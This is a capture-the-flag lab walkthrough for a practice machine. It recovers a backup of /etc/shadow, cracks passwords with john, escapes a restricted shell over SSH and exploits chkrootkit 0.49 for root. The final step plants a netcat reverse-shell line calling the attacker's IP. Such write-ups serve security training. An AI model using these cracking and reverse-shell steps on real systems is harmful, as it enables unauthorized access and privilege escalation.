Summary
This machine is exploited by leaking and brute-forcing a backup of /etc/shadow. It is escalated by a local privilege escalation vulnerability in Chkrootkit version 0.49 that is run by the root user.
#chkrootkit

Enumeration
Nmap
We start off by running an nmap scan:

kali@kali:~$ sudo nmap 192.168.120.164
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 10:52 EDT
Nmap scan report for 192.168.120.164
Host is up (0.038s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
We will further enumerate the discovered SSH and HTTP services:

kali@kali:~$ sudo nmap -sV -sC -p 22,80 192.168.120.164
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 11:02 EDT
Nmap scan report for 192.168.120.164
Host is up (0.029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)
|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)
|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
|_
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Index of /
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Web Enumeration
In the more detailed scan, we see a zip file save.zip in the web root:

...
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
...
We can download this file for further inspection:

kali@kali:~$ wget http://192.168.120.164/save.zip
--2020-08-26 13:03:56--  http://192.168.120.164/save.zip
Connecting to 192.168.120.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3123 (3.0K) [application/zip]
Saving to: ‘save.zip’

save.zip                    100%[=========================================>]   3.05K  --.-KB/s    in 0s      

2020-08-26 13:03:56 (314 MB/s) - ‘save.zip’ saved [3123/3123]
However, when trying to unzip the file, we see that it is password protected:

kali@kali:~$ unzip save.zip 
Archive:  save.zip
[save.zip] etc/passwd password: 
^C
kali@kali:~$ 
Exploitation
Cracking Zip File
We will try to brute-force the needed password with john. First, we will use zip2john to convert the file to a format supported by the password cracker:

kali@kali:~$ zip2john save.zip > pass.hash
Created directory: /home/kali/.john
ver 2.0 efh 5455 efh 7875 save.zip/etc/passwd PKZIP Encr: 2b chk, TS_chk, cmplen=668, decmplen=1807, crc=B3ACDAFE
ver 2.0 efh 5455 efh 7875 save.zip/etc/shadow PKZIP Encr: 2b chk, TS_chk, cmplen=434, decmplen=1111, crc=E11EC139
ver 2.0 efh 5455 efh 7875 save.zip/etc/group PKZIP Encr: 2b chk, TS_chk, cmplen=460, decmplen=829, crc=A1F81C08
ver 2.0 efh 5455 efh 7875 save.zip/etc/sudoers PKZIP Encr: 2b chk, TS_chk, cmplen=368, decmplen=669, crc=FF05389F
ver 2.0 efh 5455 efh 7875 save.zip/etc/hosts PKZIP Encr: 2b chk, TS_chk, cmplen=140, decmplen=185, crc=DFB905CD
ver 1.0 efh 5455 efh 7875 save.zip/etc/hostname PKZIP Encr: 2b chk, TS_chk, cmplen=45, decmplen=33, crc=D9C379A9
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
kali@kali:~$
kali@kali:~$ ls
pass.hash  save.zip
kali@kali:~$ cat pass.hash 
save.zip:$pkzip2$3*2*1*0*8*24*a1f8*8d07*7d51a96d3e3fa4083bbfbe90ee97ddba1f39f769fcf1b2b6fd573fdca8c97dbec5bc9841*1*0*8*24*b3ac*90ab*f7fe58aeaaa3c46c54524ee024bd38dae36f3110a07f1e7aba266acbf8b5ff0caf42e05e*2*0*2d*21*d9c379a9*9b9*46*0*2d*d9c3*8ce8*aae40dfa55b72fd591a639c8c6d35b8cabd267f7edacb40a6ddf1285907b062c99ec6cc8b55d9f0027f553a44f*$/pkzip2$::save.zip:etc/hostname, etc/group, etc/passwd:save.zip
kali@kali:~$ 
Now we can attack the hash file with john using the rockyou.txt wordlist:

kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manuel           (save.zip)
1g 0:00:00:00 DONE (2020-08-26 13:07) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
The tool very quickly finds that the needed password to unlock the zip file is manuel. Now we can extract the contents of the file:

kali@kali:~$ unzip save.zip 
Archive:  save.zip
[save.zip] etc/passwd password: 
  inflating: etc/passwd              
  inflating: etc/shadow              
  inflating: etc/group               
  inflating: etc/sudoers             
  inflating: etc/hosts               
 extracting: etc/hostname
kali@kali:~$ 
kali@kali:~$ ls
etc  pass.hash  save.zip
kali@kali:~$ ls -l etc/
total 24
-rw-r--r-- 1 kali kali  829 Jun 27 17:40 group
-rw-r--r-- 1 kali kali   33 Jun 27 17:39 hostname
-rw-r--r-- 1 kali kali  185 Jun 27 16:58 hosts
-rw-r--r-- 1 kali kali 1807 Jun 27 18:05 passwd
-rw-r----- 1 kali kali 1111 Jul  7 16:26 shadow
-r--r----- 1 kali kali  669 Feb  2  2020 sudoers
We find what looks to be a backup of some of the files in the target's /etc directory. Most importantly, we have the /etc/shadow file with user password hashes.

Cracking Shadow File
Inside the shadow file, we find two users of interest (root and user 296640a3b825115a47b68fc44501c828):

kali@kali:~$ cat etc/shadow | grep 18450
root:$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.:18450:0:99999:7:::
296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::
kali@kali:~$
We will copy these hashes into another file and try to crack them:

kali@kali:~$ cat etc/shadow | grep 18450 > users.hash
kali@kali:~/Documents/PG-PLAY/sunsetdecoy$ cat users.hash 
root:$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.:18450:0:99999:7:::
296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::
kali@kali:~$
We can use john and the rockyou.txt wordlist once again:

kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt users.hash 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
server           (296640a3b825115a47b68fc44501c828)
1g 0:00:00:45 0.99% (ETA: 14:31:16) 0.02185g/s 3670p/s 4045c/s 4045C/s playoffs..paris17
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
john cracks the user's password quite quickly, but we are not able to crack the root user password. Nevertheless, we have obtained credentials 296640a3b825115a47b68fc44501c828:server.

SSH
With the recovered user credentials, we are able to SSH into the target. Before we do, however, we will take a look at the recovered /etc/passwd file to find out more about this user:

kali@kali:~$ cat etc/passwd | grep "296640a3b825115a47b68fc44501c828"
296640a3b825115a47b68fc44501c828:x:1000:1000:,,,:/home/296640a3b825115a47b68fc44501c828:/bin/rbash
kali@kali:~$
We see that the default shell of the user is /bin/rbash, which is a restricted shell. In order to escape this restricted environment, we will append -t "bash --noprofile" to the ssh command:

kali@kali:~$ ssh 296640a3b825115a47b68fc44501c828@192.168.120.164 -t "bash --noprofile"
...
296640a3b825115a47b68fc44501c828@192.168.120.164's password: 
bash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ id
uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) groups=1000(296640a3b825115a47b68fc44501c828)
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$
Escalation
Local Enumeration
Something we will quickly discover is that our PATH is not very useful right now:

296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami
bash: whoami: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo $PATH
PATH:/home/296640a3b825115a47b68fc44501c828/
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/whoami
296640a3b825115a47b68fc44501c828
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$
We can either fix it or simply use full binary paths when executing programs. In the home directory of the user, we find the following:

296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls
honeypot.decoy  honeypot.decoy.cpp  id  ifconfig  ls  mkdir
...
We will try to run the honeypot.decoy binary:

296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
--------------------------------------------------

Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.

Option selected:
...
We are met with this selection, of which we will choose option 5 Launch an AV Scan:

...
Option selected:5

The AV Scan will be launched in a minute or less.
--------------------------------------------------
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$
The system informs us that the scan will be launched within 60 seconds. This hints that there is a process that is running that we might want a closer look into.

PSpy Process Monitor
We will try running the PSpy process monitoring tool to check what might be running on the system. Download the tool from https://github.com/DominicBreuker/pspy and host it on the attacking web server:

kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.164 - - [26/Aug/2020 13:25:01] "GET /pspy64 HTTP/1.1" 200 -
...
We will download it onto the target and execute it there:

296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cd /tmp
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/wget http://192.168.118.3/pspy64
--2020-08-26 13:25:01--  http://192.168.118.3/pspy64
Connecting to 192.168.118.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                      100%[=========================================>]   2.94M  1.06MB/s    in 2.8s    

2020-08-26 13:25:03 (1.06 MB/s) - ‘pspy64’ saved [3078592/3078592]

296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/chmod +x pspy64 
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
...
After some more output, PSpy shows us the following:

...
2020/08/26 13:26:01 CMD: UID=0    PID=5285   | /usr/sbin/CRON -f 
2020/08/26 13:26:01 CMD: UID=0    PID=5286   | /usr/sbin/CRON -f 
2020/08/26 13:26:01 CMD: UID=0    PID=5287   | /bin/sh -c /bin/bash /root/script.sh 
2020/08/26 13:26:01 CMD: UID=0    PID=5288   | /bin/bash /root/script.sh 
2020/08/26 13:26:01 CMD: UID=0    PID=5291   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2020/08/26 13:26:01 CMD: UID=0    PID=5290   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2020/08/26 13:26:01 CMD: UID=0    PID=5289   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2020/08/26 13:26:01 CMD: UID=0    PID=5292   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2020/08/26 13:26:01 CMD: UID=0    PID=5305   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2020/08/26 13:26:01 CMD: UID=0    PID=5306   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2020/08/26 13:26:01 CMD: UID=0    PID=5307   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2020/08/26 13:26:01 CMD: UID=0    PID=5308   | /bin/sh /root/chkrootkit-0.49/chkrootkit
...
Looking up chkrootkit-0.49 leads us directly to a local privilege escalation vulnerability in Chkrootkit version 0.49 (https://www.exploit-db.com/exploits/33899).

Local Privilege Escalation
First, start a netcat listener:

kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
...
Following the exploit, we will create a file /tmp/update on the target, drop a reverse shell payload into it, give it executable permissions, and then wait for the process to call and execute our payload:

296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ echo "/usr/bin/nc 192.168.118.3 4444 -e /bin/sh" > update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/cat update
/usr/bin/nc 192.168.118.3 4444 -e /bin/sh
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /bin/chmod +x update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$
After waiting up to a minute, the process executes our payload, and we obtain a root shell:

kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...
192.168.120.164: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.164] 56536
python -c 'import pty; pty.spawn("/bin/bash")'
root@60832e9f188106ec5bcc4eb7709ce592:~# whoami
whoami
root
root@60832e9f188106ec5bcc4eb7709ce592:~#